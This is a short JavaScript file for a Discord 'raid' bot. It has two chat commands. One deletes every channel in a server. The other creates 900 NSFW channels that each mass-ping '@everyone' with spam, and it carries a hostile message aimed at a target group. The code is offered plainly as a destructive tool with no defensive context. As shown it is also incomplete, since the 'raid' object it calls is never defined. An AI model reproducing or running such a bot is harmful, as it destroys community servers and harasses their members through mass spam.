const Discord = require('discord.js');

const client = new Discord.Client({
    intents: [
        Discord.GatewayIntentBits.Guilds,
        Discord.GatewayIntentBits.GuildMessages,
        Discord.GatewayIntentBits.MessageContent
    ]
});



client.on('message', async message => {
    if(message.content.startsWith('!deletechannels')) {
        await raid.deleteAllChannels(message.guild.id)
    }
})

client.on('message', message => {
    if(message.content.startsWith('!channel')) {
        raid.createChannelsLoop(message.guild.id, {
            amount_of_created_channels: 900,
            message_that_will_be_sent: "@everyone gg",
            times_message_is_sent: 10,
            channels_name: "GG MSC",
            reason_channels: "MSC YOUR FUCKED",
            channels_topic: "MSC",
            nsfw: true,
            channel_cooldown: 10
        })
    }
})

client.login(process.env.TOKEN);
